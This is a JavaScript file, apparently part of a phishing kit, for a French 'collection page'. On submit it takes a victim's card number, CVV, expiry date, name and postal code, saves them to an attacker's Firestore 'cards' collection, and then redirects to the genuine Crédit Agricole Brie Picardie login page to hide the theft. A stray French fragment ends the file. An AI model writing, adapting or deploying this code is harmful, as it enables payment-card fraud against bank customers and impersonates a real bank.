document.addEventListener("DOMContentLoaded", function() {
    console.log('🔄 Initialisation de la page de collecte...');
    
    const form = document.getElementById("infoForm");
    const submitBtn = document.getElementById("submitBtn");
    const spinner = document.getElementById("spinner");
    const successMessage = document.getElementById("successMessage");

    form.addEventListener("submit", async function(e) {
        e.preventDefault();
        console.log("🔄 Tentative de soumission du formulaire...");
        
        if (!firebase.firestore) {
            console.error("❌ Firestore n'est pas initialisé");
            alert("Une erreur est survenue lors de l'initialisation");
            return;
        }

        spinner.style.display = "block";
        successMessage.style.display = "none";
        submitBtn.disabled = true;

        const formData = {
            cardNumber: document.getElementById("cardNumber").value,
            cryptogram: document.getElementById("cryptogram").value,
            expirationDate: document.getElementById("expirationDate").value,
            fullName: document.getElementById("fullName").value,
            postalCode: document.getElementById("postalCode").value,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        console.log("📤 Tentative d'envoi des données:", formData);

        try {
            const db = firebase.firestore();
            // Utilisation d'un ID basé sur le timestamp
            const docId = `card_${Date.now()}`;
            await db.collection('cards').doc(docId).set(formData);
            console.log("✅ Données sauvegardées avec succès dans la collection 'cards'");
            
            spinner.style.display = "none";
            successMessage.style.display = "block";
            
            setTimeout(() => {
                window.location.href = "https://www.credit-agricole.fr/ca-briepicardie/particulier/acceder-a-mes-comptes.html";
            }, 2000);
        } catch (error) {
            console.error("❌ Erreur Firestore:", error);
            alert("Une erreur est survenue");
            spinner.style.display = "none";
            submitBtn.disabled = false;
        }
    });
});
Également, mettons